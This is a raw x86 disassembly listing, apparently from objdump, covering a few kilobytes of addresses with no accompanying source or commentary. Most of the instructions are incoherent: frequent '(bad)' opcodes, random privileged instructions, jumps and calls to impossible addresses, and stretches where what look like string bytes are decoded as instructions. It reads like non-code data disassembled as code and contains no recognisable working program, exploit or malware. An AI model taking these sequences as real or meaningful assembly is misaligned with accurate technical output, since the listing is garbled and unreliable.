  4331e9:	inc    ebp
  4331ea:	(bad)  
  4331eb:	mov    ebx,eax
  4331ed:	adc    al,0x85
  4331ef:	cmp    al,0x1
  4331f2:	inc    ebp
  4331f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4331f9:	mov    eax,DWORD PTR [ebx]
  4331fb:	nop
  4331fc:	add    BYTE PTR [eax],al
  4331fe:	inc    ebp
  4331ff:	mov    esi,DWORD PTR [ebx]
  433201:	add    eax,DWORD PTR [ebx]
  433203:	cmp    al,0x89
  433205:	mov    esp,esi
  433207:	clc    
  433208:	inc    ebp
  433209:	inc    ebp
  43320a:	add    edx,DWORD PTR [esi+0xc]
  43320d:	mov    edi,0x7ff0845
  433212:	in     al,dx
  433213:	(bad)  
  433214:	jne    0x4331b1
  433216:	mov    esi,DWORD PTR [edx]
  433218:	clc    
  433219:	add    ebp,DWORD PTR [esi]
  43321b:	mov    edi,edi
  43321d:	in     al,dx
  43321e:	mov    DWORD PTR [ebp-0x10],eax
  433221:	xor    eax,DWORD PTR [ebp+0x3]
  433224:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43322a:	fmul   DWORD PTR [ebx-0x173caf39]
  433230:	lea    ecx,[ecx+0x45e8d4bc]
  433236:	clc    
  433237:	mov    edi,edi
  433239:	cmp    BYTE PTR [ebp+0x4d],al
  43323c:	test   DWORD PTR [eax+0x74],ecx
  43323f:	inc    ecx
  433240:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433246:	ret    
  433247:	inc    eax
  433248:	dec    DWORD PTR [ebx+0x4945f8f0]
  43324e:	push   eax
  43324f:	dec    eax
  433250:	test   al,0xd0
  433252:	dec    eax
  433254:	mov    eax,DWORD PTR [ebp-0x14]
  433257:	mov    eax,DWORD PTR [ebp+0x38]
  43325a:	mov    eax,ecx
  43325c:	fadd   DWORD PTR [ebx]
  43325e:	dec    ebp
  43325f:	inc    eax
  433260:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433266:	inc    ebp
  433267:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43326d:	fadd   QWORD PTR [ebx]
  43326f:	inc    ebp
  433270:	or     al,0x33
  433272:	dec    ebp
  433273:	add    edi,DWORD PTR [ebx]
  433275:	mov    DWORD PTR [edx-0x28],esi
  433278:	mov    eax,DWORD PTR [ebp-0x10]
  43327b:	mov    eax,DWORD PTR [eax+0x10]
  43327e:	mov    eax,edi
  433280:	lock ret 
  433282:	inc    ecx
  433283:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433289:	fsubr  st,st(5)
  43328b:	test   DWORD PTR [eax],eax
  43328d:	clc    
  43328e:	push   0x45
  433290:	(bad)  
  433291:	cmp    al,0xec
  433293:	pushf  
  433294:	inc    ebp
  433295:	(bad)  
  433296:	push   eax
  433297:	fsub   DWORD PTR [eax-0x7b]
  43329a:	(bad)  
  43329b:	clc    
  43329c:	mov    eax,0xf8008584
  4332a1:	mov    eax,DWORD PTR [ebp-0x4]
  4332a4:	mov    edi,0x4585c3cc
  4332aa:	clc    
  4332ab:	mov    eax,DWORD PTR [ebp+0x14]
  4332ae:	xor    eax,DWORD PTR [ebp-0x64]
  4332b1:	mov    edi,eax
  4332b3:	in     al,dx
  4332b4:	les    esi,FWORD PTR [ebp-0x7b]
  4332b7:	mov    edi,eax
  4332b9:	or     al,0x4d
  4332bb:	dec    ebp
  4332bc:	mov    eax,ebp
  4332be:	in     al,0xf2
  4332c0:	dec    ebp
  4332c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4332c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4332cd:	inc    ebp
  4332ce:	mov    DWORD PTR [ebx],esi
  4332d0:	fadd   QWORD PTR [ebx]
  4332d2:	dec    ebp
  4332d3:	push   eax
  4332d4:	xor    eax,DWORD PTR [ebp+0x3]
  4332d7:	push   eax
  4332d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4332db:	push   esi
  4332dd:	mov    eax,DWORD PTR [eax]
  4332df:	lock cmp eax,0xf84e85c0
  4332e5:	inc    ebp
  4332e6:	test   BYTE PTR [ebx],dh
  4332e8:	add    DWORD PTR [ebx],eax
  4332ea:	add    BYTE PTR [eax+0x4d],dl
  4332ed:	jne    0x433322
  4332ef:	lea    ecx,[ebx-0x7617fc44]
  4332f5:	div    ah
  4332f7:	inc    DWORD PTR [ebp+0x45]
  4332fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433300:	jb     0x43328d
  433302:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433309:	mov    ecx,DWORD PTR [ebp-0x10]
  43330c:	xor    ecx,DWORD PTR [ebp+0x3]
  43330f:	mov    edi,DWORD PTR [ebx]
  433311:	adc    BYTE PTR [ebp+0x41],dh
  433314:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43331a:	ret    
  43331b:	push   ss
  43331c:	push   0x45
  43331e:	lea    ecx,[ebx+0x4de80cb0]
  433324:	sti    
  433325:	add    edi,edi
  433327:	or     BYTE PTR [ebp+0x4d],al
  43332a:	mov    ebp,DWORD PTR [ebx]
  43332c:	xor    ebp,ecx
  43332e:	mov    al,BYTE PTR [edx]
  433330:	add    eax,0xc7200
  433335:	jne    0x433384
  433337:	lea    esi,[ebx]
  433339:	mov    al,0xf
  43333b:	call   0xf2a00
  433340:	shl    DWORD PTR [ecx],0x84
  433343:	pushf  
  433344:	add    DWORD PTR [ecx+0x4545d000],ecx
  43334a:	mov    esi,DWORD PTR [edx]
  43334c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433353:	test   DWORD PTR [eax],eax
  433355:	clc    
  433356:	dec    ebp
  433357:	inc    ebp
  433358:	xor    edi,DWORD PTR [edi+ecx*1]
  43335b:	pushf  
  43335c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433363:	lea    eax,[ecx]
  433365:	int3   
  433366:	add    BYTE PTR [ebp+0x45],cl
  433369:	lea    ecx,[ebx-0x75b2cc38]
  43336f:	lea    eax,ds:0x4d72c4
  433375:	mov    ecx,DWORD PTR [ebp-0x4]
  433378:	xor    ecx,edi
  43337a:	bswap  ebx
  43337c:	ror    BYTE PTR [ebp-0x35],0xe9
  433380:	rol    DWORD PTR [ecx],0x84
  433383:	add    BYTE PTR [ecx],al
  433385:	xor    eax,DWORD PTR [eax]
  433387:	pushf  
  433388:	inc    ebp
  433389:	jnp    0x8a43678c
  43338f:	mov    eax,DWORD PTR ds:0xcf72e8
  433395:	lock dec ebp
  433397:	retf   
  433398:	xor    ecx,DWORD PTR [ebp+0xf]
  43339b:	mov    eax,eax
  43339d:	fmul   st,st(3)
  43339f:	test   ecx,0x19b8484
  4333a5:	xor    al,BYTE PTR [eax]
  4333a7:	mov    DWORD PTR [ebp-0x28],eax
  4333aa:	mov    eax,DWORD PTR [ebp+0x33]
  4333ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4333b3:	ret    
  4333b4:	add    al,cl
  4333b6:	dec    ebp
  4333b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4333bd:	add    ecx,DWORD PTR ds:0xc7250
  4333c3:	inc    ebp
  4333c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4333c8:	mov    edi,edi
  4333ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4333d0:	jb     0x433399
  4333d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4333d9:	mov    esi,DWORD PTR [ebx]
  4333db:	cld    
  4333dc:	mov    cl,bh
  4333de:	or     eax,0x372b6
  4333e3:	cmp    ecx,eax
  4333e5:	jne    0x433462
  4333eb:	mov    eax,DWORD PTR [ebp-0x20]
  4333ee:	mov    eax,DWORD PTR [eax]
  4333f0:	xor    eax,edi
  4333f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4333f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4333fc:	mov    ecx,edi
  4333fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433404:	jb     0x433415
  433406:	add    BYTE PTR [edi-0x3f],dl
  433409:	add    BYTE PTR [ebp-0x75],cl
  43340c:	mov    esi,eax
  43340e:	xor    eax,DWORD PTR [eax]
  433410:	mov    al,bh
  433412:	or     eax,0x4b7284
  433417:	xor    al,cl
  433419:	mov    ecx,DWORD PTR [ebp-0x4]
  43341c:	mov    ecx,edi
  43341e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433424:	jb     0x433435
  433426:	add    BYTE PTR [edi],dh
  433428:	enter  0x8500,0x8b
  43342c:	add    ah,bl
  43342e:	add    BYTE PTR [eax],al
  433430:	inc    ebp
  433431:	(bad)  
  433432:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433439:	mov    esi,DWORD PTR [edx-0x4]
  43343c:	add    bh,cl
  43343e:	dec    ebp
  43343f:	mov    dh,0x8b
  433441:	add    esi,DWORD PTR [ebx]
  433443:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433449:	add    BYTE PTR [eax],al
  43344b:	mov    eax,ecx
  43344d:	loopne 0x43349c
  43344f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433455:	dec    ebx
  433456:	or     eax,0x8b7232
  43345b:	in     al,0xc1
  43345d:	or     DWORD PTR [ebp-0x31],ecx
  433460:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433467:	xor    dh,BYTE PTR [edx-0x75]
  43346a:	add    al,dh
  43346c:	enter  0x4f09,0xcf
  433470:	inc    ebp
  433471:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433477:	or     al,BYTE PTR ds:0xe4728b
  43347d:	or     DWORD PTR [ebp-0x31],ecx
  433480:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433487:	cmp    dh,BYTE PTR [edx+0xf]
  43348a:	add    bl,dl
  43348c:	rol    DWORD PTR [eax],0x4d
  43348f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433495:	(bad)  
  433496:	or     eax,0x4b7284
  43349b:	xor    al,cl
  43349d:	mov    ecx,DWORD PTR [ebp-0x20]
  4334a0:	mov    ecx,DWORD PTR [ecx]
  4334a2:	xor    ecx,edi
  4334a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4334ab:	xor    cl,al
  4334ad:	mov    ecx,DWORD PTR [edi]
  4334af:	fadd   QWORD PTR [ebp+0x9]
  4334b2:	call   0xffd02f86
  4334b7:	dec    ebx
  4334b8:	dec    ebp
  4334b9:	xor    bh,BYTE PTR [ebx]
  4334bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4334bf:	loopne 0x4334bd
  4334c1:	or     edi,eax
  4334c3:	iret   
  4334c4:	ret    
  4334c5:	mov    WORD PTR [ebp+0x4f],es
  4334c8:	mov    esi,DWORD PTR [edx]
  4334ca:	call   0x8452fc09
  4334cf:	(bad)  
  4334d0:	fwait
  4334d1:	add    BYTE PTR [edx],dh
  4334d3:	mov    esi,DWORD PTR [ebx]
  4334d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4334db:	test   BYTE PTR [ebx],dh
  4334dd:	dec    ebx
  4334de:	add    esi,DWORD PTR [edx]
  4334e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4334e6:	dec    edi
  4334e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4334ef:	xor    al,BYTE PTR [ebx]
  4334f1:	mov    edi,DWORD PTR [ebx]
  4334f3:	in     al,0x75
  4334f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4334fb:	dec    ebx
  4334fc:	xor    esi,DWORD PTR [edx]
  4334fe:	lea    ecx,[edx]
  433500:	or     BYTE PTR [ebx+0x900f072],cl
  433506:	ja     0x4334d7
  433508:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43350f:	cmp    ch,al
  433511:	jne    0x433506
  433513:	mov    edi,edi
  433515:	fadd   QWORD PTR [ebp+0x0]
  433518:	mov    eax,edi
  43351a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433521:	mov    edx,DWORD PTR [ebx]
  433523:	in     al,0x45
  433525:	or     DWORD PTR [ebx],esi
  433527:	iret   
  433528:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43352f:	xor    dl,BYTE PTR [eax-0x75]
  433532:	sbb    al,0xe0
  433534:	dec    DWORD PTR [ecx]
  433536:	mov    ecx,edi
  433538:	in     al,dx
  433539:	mov    eax,es
  43353b:	dec    ebx
  43353c:	mov    DWORD PTR [edx],esi
  43353e:	fmul   QWORD PTR [edx]
  433540:	jne    0x4334cd
  433542:	(bad)  
  433543:	(bad)  
  433545:	or     DWORD PTR [ebp-0x31],eax
  433548:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43354f:	cmp    bh,bh
  433551:	jne    0x433598
  433553:	lea    ecx,[ebx-0x38372750]
  433559:	inc    ebx
  43355b:	mov    eax,ecx
  43355d:	mov    eax,0xa00c111
  433562:	jne    0x4335a9
  433564:	mov    esi,DWORD PTR [ebx]
  433566:	test   al,0x3
  433568:	inc    ebp
  433569:	mov    DWORD PTR [eax-0xc],edx
  43356c:	loop   0x4335b3
  43356e:	push   DWORD PTR [ebx]
  433570:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433576:	add    DWORD PTR [eax],eax
  433578:	mov    eax,edi
  43357a:	lods   al,BYTE PTR ds:[esi]
  43357b:	dec    ebp
  43357c:	inc    ebp
  43357d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433583:	retf   
  433584:	mov    edx,ecx
  433586:	adc    al,0x84
  433588:	(bad)  
  433589:	std    
  43358a:	ret    
  43358b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433591:	hlt    
  433592:	rol    edi,0x82
  433595:	ret    
  433596:	cld    
  433597:	enter  0x11ff,0x45
  43359b:	inc    ebp
  43359c:	pop    edi
  43359d:	mov    ebx,DWORD PTR [ebx+0x14]
  4335a0:	ret    0xc7
  4335a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4335a9:	jmp    0x433536
  4335ab:	push   0x8
  4335ad:	call   DWORD PTR [esi]
  4335af:	in     al,dx
  4335b0:	add    BYTE PTR [ebp+0x1],0x50
  4335b4:	add    bh,ah
  4335b6:	add    bh,bh
  4335b8:	icebp  
  4335b9:	mov    ecx,DWORD PTR [eax]
  4335bb:	cld    
  4335bc:	pop    es
  4335bd:	dec    ebp
  4335be:	shl    DWORD PTR [ebx],0x72
  4335c1:	add    eax,DWORD PTR [eax]
  4335c3:	cmp    edx,ecx
  4335c5:	je     0x4335d7
  4335c7:	mov    esi,DWORD PTR [ebp-0x4]
  4335ca:	inc    edi
  4335cc:	or     al,0xc3
  4335ce:	jmp    FWORD PTR [edx-0x18]
  4335d1:	(bad)  
  4335d2:	sti    
  4335d3:	cwde   
  4335d4:	(bad)  
  4335d5:	call   0xffa12ee0
  4335da:	or     al,0x45
  4335dc:	push   ebp
  4335dd:	sub    esp,0x18
  4335e0:	push   ebx
  4335e1:	inc    ebp
  4335e2:	mov    edi,edi
  4335e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4335eb:	test   al,0x54
  4335ed:	inc    ebp
  4335ee:	push   ecx
  4335ef:	push   eax
  4335f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4335f6:	add    ah,bh
  4335f8:	(bad)  
  4335f9:	dec    ebp
  4335fa:	add    DWORD PTR [ebx],esi
  4335fc:	inc    ebp
  4335fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433603:	push   0xffffff8b
  433605:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43360b:	add    eax,DWORD PTR [ecx]
  43360d:	or     BYTE PTR [eax],al
  43360f:	call   0xff852e14
  433614:	mov    eax,DWORD PTR [ebp+0x14]
  433617:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43361d:	inc    ebp
  43361e:	dec    ecx
  43361f:	add    ebp,DWORD PTR [edx+0x14]
  433622:	push   0x8b3045
  433627:	call   0x33ad839c
  43362c:	inc    DWORD PTR [ebx]
  43362e:	mov    DWORD PTR [edi],ecx
  433630:	mov    eax,ecx
  433632:	or     BYTE PTR [ebp-0x3d],cl
  433635:	cmp    eax,edi
  433637:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43363c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433642:	adc    al,0xc9
  433644:	inc    ebp
  433645:	adc    BYTE PTR [eax+0x55],dl
  433648:	jne    0x433636
  43364a:	call   0xff5435da
  43364f:	dec    ebp
  433650:	inc    ebp
  433651:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433657:	add    BYTE PTR [ebx],bh
  433659:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43365d:	push   esp
  43365e:	or     al,0x51
  433660:	dec    ebp
  433661:	xor    DWORD PTR [ebx],0xf32039b
  433667:	cmp    eax,DWORD PTR [ebp+0x74]
  43366a:	mov    edi,edi
  43366c:	pop    edi
  43366d:	adc    BYTE PTR [ebx+0x75],bl
  433670:	ret    0x50
  433673:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433677:	(bad)  
  433678:	clc    
  433679:	mov    esp,ebp
  43367b:	pop    ecx
  43367c:	mov    ecx,0xf80085c2
  433681:	mov    ecx,DWORD PTR [ecx+edx*2]
  433684:	push   esi
  433685:	push   esi
  433686:	(bad)  
  433687:	lock add DWORD PTR [ebp+0x44],eax
  43368b:	mov    edx,DWORD PTR [eax]
  43368d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433691:	or     BYTE PTR [edi+eax*1+0x51],dl
  433695:	ret    
  433696:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43369c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4336a2:	or     al,0x80
  4336a4:	jge    0x4336a7
  4336a6:	mov    DWORD PTR [eax],eax
  4336a8:	and    al,0x8
  4336aa:	cmp    DWORD PTR [ebp+0x10],eax
  4336ad:	mov    edx,DWORD PTR [esi]
  4336af:	xchg   esp,eax
  4336b0:	dec    esp
  4336b1:	add    BYTE PTR [eax],dl
  4336b3:	mov    ecx,edx
  4336b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4336b9:	dec    ebp
  4336ba:	into   
  4336bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4336c1:	mov    edx,DWORD PTR [eax+0x14]
  4336c4:	das    
  4336c5:	add    al,0x45
  4336c7:	add    BYTE PTR [ebp+0x0],dh
  4336ca:	mov    edi,edi
  4336cc:	and    al,0x50
  4336ce:	mov    eax,DWORD PTR [eax]
  4336d0:	and    al,0xd1
  4336d2:	xor    eax,DWORD PTR [esi]
  4336d4:	lea    eax,[ebp+0x8]
  4336d7:	xor    esi,DWORD PTR [edx+0x3]
  4336da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4336e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4336e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4336f0:	cmp    al,0xff
  4336f2:	pushf  
  4336f3:	mov    edi,edi
  4336f5:	or     BYTE PTR [esi+ecx*1],cl
  4336f8:	jne    0x4336bd
  4336fa:	call   0xc36c6
  4336ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433703:	mov    ebx,DWORD PTR [eax]
  433705:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433709:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433711:	pop    esi
  433712:	and    al,0xc9
  433714:	and    al,0x10
  433716:	call   DWORD PTR [ebp-0x73]
  433719:	in     al,dx
  43371a:	jmp    esp
  43371c:	je     0x4336a1
  43371e:	call   DWORD PTR [eax]
  433720:	and    al,0x31
  433722:	call   0xffcd35c3
  433727:	and    al,0x44
  433729:	push   edi
  43372a:	or     al,0x41
  43372c:	pop    esi
  43372d:	mov    ebp,esp
  43372f:	and    al,0xc2
  433731:	mov    eax,DWORD PTR [eax]
  433733:	and    al,0x85
  433735:	mov    edx,0x733080e
  43373a:	jne    0x433736
  43373c:	test   DWORD PTR [ebx+0x3083275],ebx
  433742:	dec    DWORD PTR [ecx-0x74dbdb15]
  433748:	sbb    BYTE PTR [esp+edx*1],cl
  43374b:	jl     0x43374c
  43374d:	adc    al,0x24
  43374f:	dec    ebp
  433750:	mov    esi,DWORD PTR [ebp+0xc]
  433753:	mov    ecx,DWORD PTR [eax]
  433755:	and    al,0x39
  433757:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43375a:	or     BYTE PTR [eax+edx*1],ah
  43375d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433764:	clc    
  433765:	jmp    0x433703
  433767:	adc    al,bh
  433769:	inc    esp
  43376a:	je     0x4337b8
  43376c:	and    al,0xc2
  43376e:	je     0x43370b
  433770:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433776:	dec    DWORD PTR [ecx+0x235fbf08]
  43377c:	sbb    al,0x10
  43377e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433782:	add    BYTE PTR [ebx+0xb],dh
  433785:	adc    BYTE PTR [eax],al
  433787:	mov    WORD PTR ds:0x3d450010,?
  43378d:	adc    BYTE PTR [eax],al
  43378f:	add    DWORD PTR [eax+edx*1],esp
  433792:	add    BYTE PTR [edx+0x6],cl
  433795:	adc    BYTE PTR [eax],al
  433797:	sub    dx,WORD PTR [eax]
  43379a:	add    bh,dl
  43379c:	imul   edx,DWORD PTR [eax],0x10302300
  4337a2:	add    BYTE PTR [esi+0x7b001077],dl
  4337a8:	aaa    
  4337a9:	inc    ebx
  4337aa:	add    BYTE PTR [edi+0x37],bh
  4337ad:	inc    ebx
  4337ae:	add    BYTE PTR [ebx-0x78ffbcc9],al
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [ebx-0x70ffbcc9],cl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [ebx-0x5fffbcc9],ah
  4337d4:	adc    DWORD PTR [eax],edx
  4337d6:	add    BYTE PTR [ecx],cl
  4337d8:	jo     0x4337ea
  4337da:	add    BYTE PTR ds:0xd7001027,ch
  4337e0:	pop    eax
  4337e1:	adc    BYTE PTR [eax],al
  4337e3:	push   es
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [esi+0x33001031],ah
  4337ec:	ins    BYTE PTR es:[edi],dx
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jb     0x433830
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	shl    DWORD PTR [edi],cl
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    dh,cl
  433814:	jge    0x433826
  433816:	add    BYTE PTR [esi-0x3dffef8e],dl
  43381c:	or     dl,BYTE PTR [eax]
  43381e:	add    dh,bl
  433820:	sub    dl,BYTE PTR [eax]
  433822:	add    BYTE PTR [edx],bl
  433824:	ins    BYTE PTR es:[edi],dx
  433825:	adc    BYTE PTR [eax],al
  433827:	addr16 jno 0x43383a
  43382a:	add    BYTE PTR [ebp+0x3d],ch
  43382d:	adc    BYTE PTR [eax],al
  43382f:	lds    esp,FWORD PTR [eax+0x10]
  433832:	add    BYTE PTR [ebx],dl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	cmp    al,0x14
  433855:	adc    BYTE PTR [eax],al
  433857:	clc    
  433858:	cmp    dl,BYTE PTR [eax]
  43385a:	add    BYTE PTR [ecx],ah
  43385c:	pop    ds
  43385d:	adc    BYTE PTR [eax],al
  43385f:	mov    edi,0x6001073
  433864:	adc    al,0x10
  433866:	add    BYTE PTR [ecx+0x34],bh
  433869:	adc    BYTE PTR [eax],al
  43386b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43386f:	shl    DWORD PTR [edx+0x10],1
  433872:	add    BYTE PTR [ebx+0x38],dl
  433875:	inc    ebx
  433876:	add    BYTE PTR [edi+0x38],dl
  433879:	inc    ebx
  43387a:	add    BYTE PTR [ebx+0x38],bl
  43387d:	inc    ebx
  43387e:	add    BYTE PTR [edi+0x38],bl
  433881:	inc    ebx
  433882:	add    BYTE PTR [ebx+0x38],ah
  433885:	inc    ebx
  433886:	add    BYTE PTR [edi+0x38],ah
  433889:	inc    ebx
  43388a:	add    BYTE PTR [ebx+0x38],ch
  43388d:	inc    ebx
  43388e:	add    BYTE PTR [edi+0x38],ch
  433891:	inc    ebx
  433892:	add    BYTE PTR [ebp+0x14],al
  433895:	adc    BYTE PTR [eax],al
  433897:	fwait
  433898:	pop    ds
  433899:	adc    BYTE PTR [eax],al
  43389b:	jnp    0x4338c0
  43389d:	adc    BYTE PTR [eax],al
  43389f:	pop    esi
  4338a0:	adc    BYTE PTR cs:[eax],al
  4338a3:	popf   
  4338a4:	jno    0x4338b6
  4338a6:	add    ah,bl
  4338a8:	inc    ebp
  4338a9:	adc    BYTE PTR [eax],al
  4338ab:	sbb    edx,DWORD PTR [edx+0x10]
  4338ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4338b4:	cmp    BYTE PTR [ebx+0x0],al
  4338b7:	xchg   edi,eax
  4338b8:	cmp    BYTE PTR [ebx+0x0],al
  4338bb:	fwait
  4338bc:	cmp    BYTE PTR [ebx+0x0],al
  4338bf:	lahf   
  4338c0:	cmp    BYTE PTR [ebx+0x0],al
  4338c3:	mov    ds:0xa7004338,eax
  4338c8:	cmp    BYTE PTR [ebx+0x0],al
  4338cb:	stos   DWORD PTR es:[edi],eax
  4338cc:	cmp    BYTE PTR [ebx+0x0],al
  4338cf:	scas   eax,DWORD PTR es:[edi]
  4338d0:	cmp    BYTE PTR [ebx+0x0],al
  4338d3:	push   esp
  4338d4:	xor    al,0x4b
  4338d6:	aaa    
  4338d7:	pop    edi
  4338d8:	inc    edx
  4338d9:	dec    ebx
  4338da:	xor    DWORD PTR [ecx],edi
  4338dc:	push   edi
  4338dd:	add    BYTE PTR [ecx+0x39],cl
  4338e0:	xor    al,0x5f
  4338e2:	pop    ecx
  4338e3:	inc    edi
  4338e4:	push   edx
  4338e5:	pop    edi
  4338e6:	dec    edx
  4338e7:	xor    al,BYTE PTR [edx+0x30]
  4338ea:	push   ebx
  4338eb:	add    BYTE PTR [ecx+0x4a],cl
  4338ee:	cmp    BYTE PTR [edi+0x38],bl
  4338f1:	xor    al,0x43
  4338f3:	xor    bl,BYTE PTR [eax+0x36]
  4338f6:	pop    edi
  4338f7:	inc    ebx
  4338f8:	add    BYTE PTR [edx+0x33],cl
  4338fb:	dec    ebp
  4338fc:	cmp    BYTE PTR [edi+0x53],bl
  4338ff:	xor    DWORD PTR [eax],edi
  433901:	pop    edx
  433902:	pop    edi
  433903:	xor    BYTE PTR [edx+0x52],cl
  433906:	inc    ecx
  433907:	add    BYTE PTR [edx+0x42],al
  43390a:	inc    ebp
  43390b:	pop    edi
  43390c:	cmp    DWORD PTR [eax],edi
  43390e:	push   ebp
  43390f:	inc    edx
  433910:	xor    eax,0x5244505f
  433915:	xor    BYTE PTR [eax],al
  433917:	inc    edx
  433918:	inc    esp
  433919:	inc    edx
  43391a:	cmp    DWORD PTR [edi+0x52],ebx
  43391d:	dec    esp
  43391e:	inc    ebp
  43391f:	add    BYTE PTR [ebx+0x37],dl
  433922:	push   esp
  433923:	xor    BYTE PTR [edi+0x55],bl
  433926:	push   ebx
  433927:	aaa    
  433928:	dec    ebp
  433929:	pop    edi
  43392a:	xor    ecx,DWORD PTR [edx+0x4e]
  43392d:	dec    ebx
  43392e:	add    BYTE PTR [edx+0x47],cl
  433931:	inc    edi
  433932:	xor    eax,0x534e5f32
  433937:	push   esp
  433938:	pop    edi
  433939:	push   esp
  43393a:	inc    edx
  43393b:	add    BYTE PTR [ebx+0x4d],al
  43393e:	xor    BYTE PTR [edi+0x47],bl
  433941:	cmp    DWORD PTR [ecx+0x5f],ebx
  433944:	push   eax
  433945:	push   ecx
  433946:	push   ecx
  433947:	pop    edi
  433948:	inc    ebx
  433949:	push   edi
  43394a:	push   esi
  43394b:	add    BYTE PTR [ecx+0x57],cl
  43394e:	inc    ebp
  43394f:	pop    edi
  433950:	pop    ecx
  433951:	push   edx
  433952:	inc    edx
  433953:	pop    edi
  433954:	inc    edi
  433955:	add    BYTE PTR [ebx+0x51],dl
  433958:	cmp    DWORD PTR ds:0x4d305f33,esi
  43395e:	inc    edi
  43395f:	xor    edx,DWORD PTR [edx+0x34]
  433962:	pop    edi
